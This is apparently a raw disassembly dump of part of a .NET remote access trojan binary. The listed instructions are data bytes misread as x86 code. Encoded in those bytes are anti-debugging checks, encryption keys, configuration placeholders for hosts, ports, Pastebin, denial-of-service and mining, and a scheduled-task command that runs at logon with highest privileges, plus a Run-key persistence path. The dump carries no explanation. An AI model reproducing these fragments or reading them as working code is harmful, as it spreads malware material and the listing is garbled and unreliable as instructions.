  408f68:	6d                   	insl   (%dx),%es:(%edi)
  408f69:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f6b:	74 00                	je     0x408f6d
  408f6d:	70 61                	jo     0x408fd0
  408f6f:	72 65                	jb     0x408fd6
  408f71:	6e                   	outsb  %ds:(%esi),(%dx)
  408f72:	74 00                	je     0x408f74
  408f74:	53                   	push   %ebx
  408f75:	79 73                	jns    0x408fea
  408f77:	74 65                	je     0x408fde
  408f79:	6d                   	insl   (%dx),%es:(%edi)
  408f7a:	2e 43                	cs inc %ebx
  408f7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f7d:	6c                   	insb   (%dx),%es:(%edi)
  408f7e:	6c                   	insb   (%dx),%es:(%edi)
  408f7f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408f84:	6e                   	outsb  %ds:(%esi),(%dx)
  408f85:	73 2e                	jae    0x408fb5
  408f87:	49                   	dec    %ecx
  408f88:	45                   	inc    %ebp
  408f89:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8a:	75 6d                	jne    0x408ff9
  408f8c:	65 72 61             	gs jb  0x408ff0
  408f8f:	74 6f                	je     0x409000
  408f91:	72 2e                	jb     0x408fc1
  408f93:	43                   	inc    %ebx
  408f94:	75 72                	jne    0x409008
  408f96:	72 65                	jb     0x408ffd
  408f98:	6e                   	outsb  %ds:(%esi),(%dx)
  408f99:	74 00                	je     0x408f9b
  408f9b:	53                   	push   %ebx
  408f9c:	79 73                	jns    0x409011
  408f9e:	74 65                	je     0x409005
  408fa0:	6d                   	insl   (%dx),%es:(%edi)
  408fa1:	2e 43                	cs inc %ebx
  408fa3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa4:	6c                   	insb   (%dx),%es:(%edi)
  408fa5:	6c                   	insb   (%dx),%es:(%edi)
  408fa6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408fab:	6e                   	outsb  %ds:(%esi),(%dx)
  408fac:	73 2e                	jae    0x408fdc
  408fae:	49                   	dec    %ecx
  408faf:	45                   	inc    %ebp
  408fb0:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb1:	75 6d                	jne    0x409020
  408fb3:	65 72 61             	gs jb  0x409017
  408fb6:	74 6f                	je     0x409027
  408fb8:	72 2e                	jb     0x408fe8
  408fba:	67 65 74 5f          	addr16 gs je 0x40901d
  408fbe:	43                   	inc    %ebx
  408fbf:	75 72                	jne    0x409033
  408fc1:	72 65                	jb     0x409028
  408fc3:	6e                   	outsb  %ds:(%esi),(%dx)
  408fc4:	74 00                	je     0x408fc6
  408fc6:	47                   	inc    %edi
  408fc7:	65 74 43             	gs je  0x40900d
  408fca:	75 72                	jne    0x40903e
  408fcc:	72 65                	jb     0x409033
  408fce:	6e                   	outsb  %ds:(%esi),(%dx)
  408fcf:	74 00                	je     0x408fd1
  408fd1:	43                   	inc    %ebx
  408fd2:	68 65 63 6b 52       	push   $0x526b6365
  408fd7:	65 6d                	gs insl (%dx),%es:(%edi)
  408fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fda:	74 65                	je     0x409041
  408fdc:	44                   	inc    %esp
  408fdd:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408fe1:	67 65 72 50          	addr16 gs jb 0x409035
  408fe5:	72 65                	jb     0x40904c
  408fe7:	73 65                	jae    0x40904e
  408fe9:	6e                   	outsb  %ds:(%esi),(%dx)
  408fea:	74 00                	je     0x408fec
  408fec:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  408ff3:	67 65 72 50          	addr16 gs jb 0x409047
  408ff7:	72 65                	jb     0x40905e
  408ff9:	73 65                	jae    0x409060
  408ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffc:	74 00                	je     0x408ffe
  408ffe:	67 65 74 5f          	addr16 gs je 0x409061
  409002:	52                   	push   %edx
  409003:	65 6d                	gs insl (%dx),%es:(%edi)
  409005:	6f                   	outsl  %ds:(%esi),(%dx)
  409006:	74 65                	je     0x40906d
  409008:	45                   	inc    %ebp
  409009:	6e                   	outsb  %ds:(%esi),(%dx)
  40900a:	64 50                	fs push %eax
  40900c:	6f                   	outsl  %ds:(%esi),(%dx)
  40900d:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409014:	5f                   	pop    %edi
  409015:	43                   	inc    %ebx
  409016:	6f                   	outsl  %ds:(%esi),(%dx)
  409017:	75 6e                	jne    0x409087
  409019:	74 00                	je     0x40901b
  40901b:	67 65 74 5f          	addr16 gs je 0x40907e
  40901f:	50                   	push   %eax
  409020:	72 6f                	jb     0x409091
  409022:	63 65 73             	arpl   %esp,0x73(%ebp)
  409025:	73 6f                	jae    0x409096
  409027:	72 43                	jb     0x40906c
  409029:	6f                   	outsl  %ds:(%esi),(%dx)
  40902a:	75 6e                	jne    0x40909a
  40902c:	74 00                	je     0x40902e
  40902e:	47                   	inc    %edi
  40902f:	65 74 50             	gs je  0x409082
  409032:	61                   	popa
  409033:	74 68                	je     0x40909d
  409035:	52                   	push   %edx
  409036:	6f                   	outsl  %ds:(%esi),(%dx)
  409037:	6f                   	outsl  %ds:(%esi),(%dx)
  409038:	74 00                	je     0x40903a
  40903a:	44                   	inc    %esp
  40903b:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40903f:	70 74                	jo     0x4090b5
  409041:	00 45 6e             	add    %al,0x6e(%ebp)
  409044:	63 72 79             	arpl   %esi,0x79(%edx)
  409047:	70 74                	jo     0x4090bd
  409049:	00 50 61             	add    %dl,0x61(%eax)
  40904c:	72 61                	jb     0x4090af
  40904e:	6d                   	insl   (%dx),%es:(%edi)
  40904f:	65 74 65             	gs je  0x4090b7
  409052:	72 69                	jb     0x4090bd
  409054:	7a 65                	jp     0x4090bb
  409056:	64 54                	fs push %esp
  409058:	68 72 65 61 64       	push   $0x64616572
  40905d:	53                   	push   %ebx
  40905e:	74 61                	je     0x4090c1
  409060:	72 74                	jb     0x4090d6
  409062:	00 43 6f             	add    %al,0x6f(%ebx)
  409065:	6e                   	outsb  %ds:(%esi),(%dx)
  409066:	76 65                	jbe    0x4090cd
  409068:	72 74                	jb     0x4090de
  40906a:	00 43 61             	add    %al,0x61(%ebx)
  40906d:	73 74                	jae    0x4090e3
  40906f:	00 46 61             	add    %al,0x61(%esi)
  409072:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409079:	54 
  40907a:	6f                   	outsl  %ds:(%esi),(%dx)
  40907b:	4c                   	dec    %esp
  40907c:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  409083:	75 74                	jne    0x4090f9
  409085:	00 53 79             	add    %dl,0x79(%ebx)
  409088:	73 74                	jae    0x4090fe
  40908a:	65 6d                	gs insl (%dx),%es:(%edi)
  40908c:	2e 43                	cs inc %ebx
  40908e:	6f                   	outsl  %ds:(%esi),(%dx)
  40908f:	6c                   	insb   (%dx),%es:(%edi)
  409090:	6c                   	insb   (%dx),%es:(%edi)
  409091:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409096:	6e                   	outsb  %ds:(%esi),(%dx)
  409097:	73 2e                	jae    0x4090c7
  409099:	49                   	dec    %ecx
  40909a:	45                   	inc    %ebp
  40909b:	6e                   	outsb  %ds:(%esi),(%dx)
  40909c:	75 6d                	jne    0x40910b
  40909e:	65 72 61             	gs jb  0x409102
  4090a1:	74 6f                	je     0x409112
  4090a3:	72 2e                	jb     0x4090d3
  4090a5:	4d                   	dec    %ebp
  4090a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a7:	76 65                	jbe    0x40910e
  4090a9:	4e                   	dec    %esi
  4090aa:	65 78 74             	gs js  0x409121
  4090ad:	00 53 79             	add    %dl,0x79(%ebx)
  4090b0:	73 74                	jae    0x409126
  4090b2:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b4:	2e 54                	cs push %esp
  4090b6:	65 78 74             	gs js  0x40912d
  4090b9:	00 76 00             	add    %dh,0x0(%esi)
  4090bc:	73 65                	jae    0x409123
  4090be:	74 5f                	je     0x40911f
  4090c0:	43                   	inc    %ebx
  4090c1:	72 65                	jb     0x409128
  4090c3:	61                   	popa
  4090c4:	74 65                	je     0x40912b
  4090c6:	4e                   	dec    %esi
  4090c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c8:	57                   	push   %edi
  4090c9:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  4090d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d1:	64 65 78 00          	fs gs js 0x4090d5
  4090d5:	43                   	inc    %ebx
  4090d6:	6c                   	insb   (%dx),%es:(%edi)
  4090d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d8:	73 65                	jae    0x40913f
  4090da:	4d                   	dec    %ebp
  4090db:	75 74                	jne    0x409151
  4090dd:	65 78 00             	gs js  0x4090e0
  4090e0:	43                   	inc    %ebx
  4090e1:	72 65                	jb     0x409148
  4090e3:	61                   	popa
  4090e4:	74 65                	je     0x40914b
  4090e6:	4d                   	dec    %ebp
  4090e7:	75 74                	jne    0x40915d
  4090e9:	65 78 00             	gs js  0x4090ec
  4090ec:	44                   	inc    %esp
  4090ed:	65 6c                	gs insb (%dx),%es:(%edi)
  4090ef:	61                   	popa
  4090f0:	79 00                	jns    0x4090f2
  4090f2:	57                   	push   %edi
  4090f3:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  4090fa:	61                   	popa
  4090fb:	79 00                	jns    0x4090fd
  4090fd:	49                   	dec    %ecx
  4090fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ff:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409106:	65 
  409107:	41                   	inc    %ecx
  409108:	72 72                	jb     0x40917c
  40910a:	61                   	popa
  40910b:	79 00                	jns    0x40910d
  40910d:	4d                   	dec    %ebp
  40910e:	73 67                	jae    0x409177
  409110:	50                   	push   %eax
  409111:	61                   	popa
  409112:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409115:	72 72                	jb     0x409189
  409117:	61                   	popa
  409118:	79 00                	jns    0x40911a
  40911a:	54                   	push   %esp
  40911b:	6f                   	outsl  %ds:(%esi),(%dx)
  40911c:	41                   	inc    %ecx
  40911d:	72 72                	jb     0x409191
  40911f:	61                   	popa
  409120:	79 00                	jns    0x409122
  409122:	67 65 74 5f          	addr16 gs je 0x409185
  409126:	41                   	inc    %ecx
  409127:	73 41                	jae    0x40916a
  409129:	72 72                	jb     0x40919d
  40912b:	61                   	popa
  40912c:	79 00                	jns    0x40912e
  40912e:	72 65                	jb     0x409195
  409130:	66 41                	inc    %cx
  409132:	73 41                	jae    0x409175
  409134:	72 72                	jb     0x4091a8
  409136:	61                   	popa
  409137:	79 00                	jns    0x409139
  409139:	67 65 74 5f          	addr16 gs je 0x40919c
  40913d:	4b                   	dec    %ebx
  40913e:	65 79 00             	gs jns 0x409141
  409141:	73 65                	jae    0x4091a8
  409143:	74 5f                	je     0x4091a4
  409145:	4b                   	dec    %ebx
  409146:	65 79 00             	gs jns 0x409149
  409149:	43                   	inc    %ebx
  40914a:	72 65                	jb     0x4091b1
  40914c:	61                   	popa
  40914d:	74 65                	je     0x4091b4
  40914f:	53                   	push   %ebx
  409150:	75 62                	jne    0x4091b4
  409152:	4b                   	dec    %ebx
  409153:	65 79 00             	gs jns 0x409156
  409156:	44                   	inc    %esp
  409157:	65 6c                	gs insb (%dx),%es:(%edi)
  409159:	65 74 65             	gs je  0x4091c1
  40915c:	53                   	push   %ebx
  40915d:	75 62                	jne    0x4091c1
  40915f:	4b                   	dec    %ebx
  409160:	65 79 00             	gs jns 0x409163
  409163:	4f                   	dec    %edi
  409164:	70 65                	jo     0x4091cb
  409166:	6e                   	outsb  %ds:(%esi),(%dx)
  409167:	53                   	push   %ebx
  409168:	75 62                	jne    0x4091cc
  40916a:	4b                   	dec    %ebx
  40916b:	65 79 00             	gs jns 0x40916e
  40916e:	67 65 74 5f          	addr16 gs je 0x4091d1
  409172:	50                   	push   %eax
  409173:	75 62                	jne    0x4091d7
  409175:	6c                   	insb   (%dx),%es:(%edi)
  409176:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  40917d:	61                   	popa
  40917e:	75 74                	jne    0x4091f4
  409180:	68 4b 65 79 00       	push   $0x79654b
  409185:	6d                   	insl   (%dx),%es:(%edi)
  409186:	61                   	popa
  409187:	73 74                	jae    0x4091fd
  409189:	65 72 4b             	gs jb  0x4091d7
  40918c:	65 79 00             	gs jns 0x40918f
  40918f:	52                   	push   %edx
  409190:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409197:	4b 65 
  409199:	79 00                	jns    0x40919b
  40919b:	5f                   	pop    %edi
  40919c:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  4091a0:	53                   	push   %ebx
  4091a1:	79 73                	jns    0x409216
  4091a3:	74 65                	je     0x40920a
  4091a5:	6d                   	insl   (%dx),%es:(%edi)
  4091a6:	2e 53                	cs push %ebx
  4091a8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091ac:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4091b3:	70 
  4091b4:	74 6f                	je     0x409225
  4091b6:	67 72 61             	addr16 jb 0x40921a
  4091b9:	70 68                	jo     0x409223
  4091bb:	79 00                	jns    0x4091bd
  4091bd:	41                   	inc    %ecx
  4091be:	73 73                	jae    0x409233
  4091c0:	65 6d                	gs insl (%dx),%es:(%edi)
  4091c2:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4091c6:	41                   	inc    %ecx
  4091c7:	64 64 72 65          	fs fs jb 0x409230
  4091cb:	73 73                	jae    0x409240
  4091cd:	46                   	inc    %esi
  4091ce:	61                   	popa
  4091cf:	6d                   	insl   (%dx),%es:(%edi)
  4091d0:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  4091d7:	63 
  4091d8:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  4091dc:	79 00                	jns    0x4091de
  4091de:	57                   	push   %edi
  4091df:	72 69                	jb     0x40924a
  4091e1:	74 65                	je     0x409248
  4091e3:	42                   	inc    %edx
  4091e4:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  4091eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ec:	42                   	inc    %edx
  4091ed:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  4091f4:	65 74 5f             	gs je  0x409256
  4091f7:	53                   	push   %ebx
  4091f8:	79 73                	jns    0x40926d
  4091fa:	74 65                	je     0x409261
  4091fc:	6d                   	insl   (%dx),%es:(%edi)
  4091fd:	44                   	inc    %esp
  4091fe:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409205:	79 00                	jns    0x409207
  409207:	53                   	push   %ebx
  409208:	65 74 52             	gs je  0x40925d
  40920b:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409212:	00 6f 
  409214:	70 5f                	jo     0x409275
  409216:	45                   	inc    %ebp
  409217:	71 75                	jno    0x40928e
  409219:	61                   	popa
  40921a:	6c                   	insb   (%dx),%es:(%edi)
  40921b:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409222:	49 
  409223:	6e                   	outsb  %ds:(%esi),(%dx)
  409224:	65 71 75             	gs jno 0x40929c
  409227:	61                   	popa
  409228:	6c                   	insb   (%dx),%es:(%edi)
  409229:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409230:	74 
  409231:	65 6d                	gs insl (%dx),%es:(%edi)
  409233:	2e 4e                	cs dec %esi
  409235:	65 74 2e             	gs je  0x409266
  409238:	53                   	push   %ebx
  409239:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40923d:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409244:	64 
  409245:	6f                   	outsl  %ds:(%esi),(%dx)
  409246:	77 73                	ja     0x4092bb
  409248:	49                   	dec    %ecx
  409249:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40924c:	74 69                	je     0x4092b7
  40924e:	74 79                	je     0x4092c9
  409250:	00 49 73             	add    %cl,0x73(%ecx)
  409253:	4e                   	dec    %esi
  409254:	75 6c                	jne    0x4092c2
  409256:	6c                   	insb   (%dx),%es:(%edi)
  409257:	4f                   	dec    %edi
  409258:	72 45                	jb     0x40929f
  40925a:	6d                   	insl   (%dx),%es:(%edi)
  40925b:	70 74                	jo     0x4092d1
  40925d:	79 00                	jns    0x40925f
  40925f:	00 00                	add    %al,(%eax)
  409261:	0d 53 00 48 00       	or     $0x480053,%eax
  409266:	41                   	inc    %ecx
  409267:	00 32                	add    %dh,(%edx)
  409269:	00 35 00 36 00 00    	add    %dh,0x3600
  40926f:	0f 25                	(bad)
  409271:	00 50 00             	add    %dl,0x0(%eax)
  409274:	6f                   	outsl  %ds:(%esi),(%dx)
  409275:	00 72 00             	add    %dh,0x0(%edx)
  409278:	74 00                	je     0x40927a
  40927a:	73 00                	jae    0x40927c
  40927c:	25 00 00 0f 25       	and    $0x250f0000,%eax
  409281:	00 48 00             	add    %cl,0x0(%eax)
  409284:	6f                   	outsl  %ds:(%esi),(%dx)
  409285:	00 73 00             	add    %dh,0x0(%ebx)
  409288:	74 00                	je     0x40928a
  40928a:	73 00                	jae    0x40928c
  40928c:	25 00 00 13 25       	and    $0x25130000,%eax
  409291:	00 56 00             	add    %dl,0x0(%esi)
  409294:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409298:	73 00                	jae    0x40929a
  40929a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4092a0:	25 00 00 13 25       	and    $0x25130000,%eax
  4092a5:	00 49 00             	add    %cl,0x0(%ecx)
  4092a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a9:	00 73 00             	add    %dh,0x0(%ebx)
  4092ac:	74 00                	je     0x4092ae
  4092ae:	61                   	popa
  4092af:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4092b3:	00 25 00 00 11 25    	add    %ah,0x25110000
  4092b9:	00 46 00             	add    %al,0x0(%esi)
  4092bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092bd:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  4092c1:	00 65 00             	add    %ah,0x0(%ebp)
  4092c4:	72 00                	jb     0x4092c6
  4092c6:	25 00 00 0d 25       	and    $0x250d0000,%eax
  4092cb:	00 46 00             	add    %al,0x0(%esi)
  4092ce:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4092d4:	25 00 00 0b 25       	and    $0x250b0000,%eax
  4092d9:	00 4b 00             	add    %cl,0x0(%ebx)
  4092dc:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4092e0:	25 00 00 0b 25       	and    $0x250b0000,%eax
  4092e5:	00 4d 00             	add    %cl,0x0(%ebp)
  4092e8:	54                   	push   %esp
  4092e9:	00 58 00             	add    %bl,0x0(%eax)
  4092ec:	25 00 00 1b 25       	and    $0x251b0000,%eax
  4092f1:	00 43 00             	add    %al,0x0(%ebx)
  4092f4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4092f8:	74 00                	je     0x4092fa
  4092fa:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  409300:	63 00                	arpl   %eax,(%eax)
  409302:	61                   	popa
  409303:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409307:	00 25 00 00 23 25    	add    %ah,0x25230000
  40930d:	00 53 00             	add    %dl,0x0(%ebx)
  409310:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409314:	76 00                	jbe    0x409316
  409316:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40931a:	73 00                	jae    0x40931c
  40931c:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  409322:	61                   	popa
  409323:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  409327:	00 72 00             	add    %dh,0x0(%edx)
  40932a:	65 00 25 00 00 0d 25 	add    %ah,%gs:0x250d0000
  409331:	00 41 00             	add    %al,0x0(%ecx)
  409334:	6e                   	outsb  %ds:(%esi),(%dx)
  409335:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409339:	00 25 00 00 15 25    	add    %ah,0x25150000
  40933f:	00 50 00             	add    %dl,0x0(%eax)
  409342:	61                   	popa
  409343:	00 73 00             	add    %dh,0x0(%ebx)
  409346:	74 00                	je     0x409348
  409348:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40934c:	69 00 6e 00 25 00    	imul   $0x25006e,(%eax),%eax
  409352:	00 0d 25 00 42 00    	add    %cl,0x420025
  409358:	44                   	inc    %esp
  409359:	00 4f 00             	add    %cl,0x0(%edi)
  40935c:	53                   	push   %ebx
  40935d:	00 25 00 00 01 00    	add    %ah,0x10000
  409363:	0f 25                	(bad)
  409365:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409369:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40936d:	00 79 00             	add    %bh,0x0(%ecx)
  409370:	25 00 00 09 6e       	and    $0x6e090000,%eax
  409375:	00 75 00             	add    %dh,0x0(%ebp)
  409378:	6c                   	insb   (%dx),%es:(%edi)
  409379:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40937d:	03 3a                	add    (%edx),%edi
  40937f:	00 00                	add    %al,(%eax)
  409381:	0d 50 00 61 00       	or     $0x610050,%eax
  409386:	63 00                	arpl   %eax,(%eax)
  409388:	6b 00 65             	imul   $0x65,(%eax),%eax
  40938b:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40938f:	09 50 00             	or     %edx,0x0(%eax)
  409392:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409398:	00 0f                	add    %cl,(%edi)
  40939a:	4d                   	dec    %ebp
  40939b:	00 65 00             	add    %ah,0x0(%ebp)
  40939e:	73 00                	jae    0x4093a0
  4093a0:	73 00                	jae    0x4093a2
  4093a2:	61                   	popa
  4093a3:	00 67 00             	add    %ah,0x0(%edi)
  4093a6:	65 00 00             	add    %al,%gs:(%eax)
  4093a9:	0d 4d 00 49 00       	or     $0x49004d,%eax
  4093ae:	4e                   	dec    %esi
  4093af:	00 45 00             	add    %al,0x0(%ebp)
  4093b2:	52                   	push   %edx
  4093b3:	00 20                	add    %ah,(%eax)
  4093b5:	00 00                	add    %al,(%eax)
  4093b7:	03 30                	add    (%eax),%esi
  4093b9:	00 00                	add    %al,(%eax)
  4093bb:	0f 7b                	(bad)
  4093bd:	00 30                	add    %dh,(%eax)
  4093bf:	00 3a                	add    %bh,(%edx)
  4093c1:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  4093c5:	00 7d 00             	add    %bh,0x0(%ebp)
  4093c8:	20 00                	and    %al,(%eax)
  4093ca:	00 0f                	add    %cl,(%edi)
  4093cc:	7b 00                	jnp    0x4093ce
  4093ce:	30 00                	xor    %al,(%eax)
  4093d0:	3a 00                	cmp    (%eax),%al
  4093d2:	58                   	pop    %eax
  4093d3:	00 32                	add    %dh,(%edx)
  4093d5:	00 7d 00             	add    %bh,0x0(%ebp)
  4093d8:	20 00                	and    %al,(%eax)
  4093da:	00 2b                	add    %ch,(%ebx)
  4093dc:	28 00                	sub    %al,(%eax)
  4093de:	6e                   	outsb  %ds:(%esi),(%dx)
  4093df:	00 65 00             	add    %ah,0x0(%ebp)
  4093e2:	76 00                	jbe    0x4093e4
  4093e4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4093e8:	20 00                	and    %al,(%eax)
  4093ea:	75 00                	jne    0x4093ec
  4093ec:	73 00                	jae    0x4093ee
  4093ee:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  4093f3:	00 20                	add    %ah,(%eax)
  4093f5:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4093f9:	00 70 00             	add    %dh,0x0(%eax)
  4093fc:	65 00 20             	add    %ah,%gs:(%eax)
  4093ff:	00 24 00             	add    %ah,(%eax,%eax,1)
  409402:	63 00                	arpl   %eax,(%eax)
  409404:	31 00                	xor    %eax,(%eax)
  409406:	00 45 28             	add    %al,0x28(%ebp)
  409409:	00 65 00             	add    %ah,0x0(%ebp)
  40940c:	78 00                	js     0x40940e
  40940e:	74 00                	je     0x409410
  409410:	38 00                	cmp    %al,(%eax)
  409412:	2c 00                	sub    $0x0,%al
  409414:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409418:	74 00                	je     0x40941a
  40941a:	31 00                	xor    %eax,(%eax)
  40941c:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  409420:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409424:	33 00                	xor    (%eax),%eax
  409426:	32 00                	xor    (%eax),%al
  409428:	29 00                	sub    %eax,(%eax)
  40942a:	20 00                	and    %al,(%eax)
  40942c:	74 00                	je     0x40942e
  40942e:	79 00                	jns    0x409430
  409430:	70 00                	jo     0x409432
  409432:	65 00 20             	add    %ah,%gs:(%eax)
  409435:	00 24 00             	add    %ah,(%eax,%eax,1)
  409438:	63 00                	arpl   %eax,(%eax)
  40943a:	37                   	aaa
  40943b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40943e:	24 00                	and    $0x0,%al
  409440:	63 00                	arpl   %eax,(%eax)
  409442:	38 00                	cmp    %al,(%eax)
  409444:	2c 00                	sub    $0x0,%al
  409446:	24 00                	and    $0x0,%al
  409448:	63 00                	arpl   %eax,(%eax)
  40944a:	39 00                	cmp    %eax,(%eax)
  40944c:	00 19                	add    %bl,(%ecx)
  40944e:	73 00                	jae    0x409450
  409450:	63 00                	arpl   %eax,(%eax)
  409452:	68 00 74 00 61       	push   $0x61007400
  409457:	00 73 00             	add    %dh,0x0(%ebx)
  40945a:	6b 00 73             	imul   $0x73,(%eax),%eax
  40945d:	00 2e                	add    %ch,(%esi)
  40945f:	00 65 00             	add    %ah,0x0(%ebp)
  409462:	78 00                	js     0x409464
  409464:	65 00 00             	add    %al,%gs:(%eax)
  409467:	53                   	push   %ebx
  409468:	2f                   	das
  409469:	00 63 00             	add    %ah,0x0(%ebx)
  40946c:	72 00                	jb     0x40946e
  40946e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409472:	74 00                	je     0x409474
  409474:	65 00 20             	add    %ah,%gs:(%eax)
  409477:	00 2f                	add    %ch,(%edi)
  409479:	00 66 00             	add    %ah,0x0(%esi)
  40947c:	20 00                	and    %al,(%eax)
  40947e:	2f                   	das
  40947f:	00 73 00             	add    %dh,0x0(%ebx)
  409482:	63 00                	arpl   %eax,(%eax)
  409484:	20 00                	and    %al,(%eax)
  409486:	4f                   	dec    %edi
  409487:	00 4e 00             	add    %cl,0x0(%esi)
  40948a:	4c                   	dec    %esp
  40948b:	00 4f 00             	add    %cl,0x0(%edi)
  40948e:	47                   	inc    %edi
  40948f:	00 4f 00             	add    %cl,0x0(%edi)
  409492:	4e                   	dec    %esi
  409493:	00 20                	add    %ah,(%eax)
  409495:	00 2f                	add    %ch,(%edi)
  409497:	00 52 00             	add    %dl,0x0(%edx)
  40949a:	4c                   	dec    %esp
  40949b:	00 20                	add    %ah,(%eax)
  40949d:	00 48 00             	add    %cl,0x0(%eax)
  4094a0:	49                   	dec    %ecx
  4094a1:	00 47 00             	add    %al,0x0(%edi)
  4094a4:	48                   	dec    %eax
  4094a5:	00 45 00             	add    %al,0x0(%ebp)
  4094a8:	53                   	push   %ebx
  4094a9:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4094ad:	00 2f                	add    %ch,(%edi)
  4094af:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  4094b3:	00 20                	add    %ah,(%eax)
  4094b5:	00 22                	add    %ah,(%edx)
  4094b7:	00 27                	add    %ah,(%edi)
  4094b9:	00 01                	add    %al,(%ecx)
  4094bb:	13 22                	adc    (%edx),%esp
  4094bd:	00 27                	add    %ah,(%edi)
  4094bf:	00 20                	add    %ah,(%eax)
  4094c1:	00 2f                	add    %ch,(%edi)
  4094c3:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4094c7:	00 20                	add    %ah,(%eax)
  4094c9:	00 22                	add    %ah,(%edx)
  4094cb:	00 27                	add    %ah,(%edi)
  4094cd:	00 01                	add    %al,(%ecx)
  4094cf:	05 22 00 27 00       	add    $0x270022,%eax
  4094d4:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  4094d7:	00 6e 00             	add    %ch,0x0(%esi)
  4094da:	75 00                	jne    0x4094dc
  4094dc:	52                   	push   %edx
  4094dd:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  4094e1:	00 6f 00             	add    %ch,0x0(%edi)
  4094e4:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  4094ea:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4094ee:	74 00                	je     0x4094f0
  4094f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094f1:	00 65 00             	add    %ah,0x0(%ebp)
  4094f4:	72 00                	jb     0x4094f6
  4094f6:	72 00                	jb     0x4094f8
  4094f8:	75 00                	jne    0x4094fa
  4094fa:	43                   	inc    %ebx
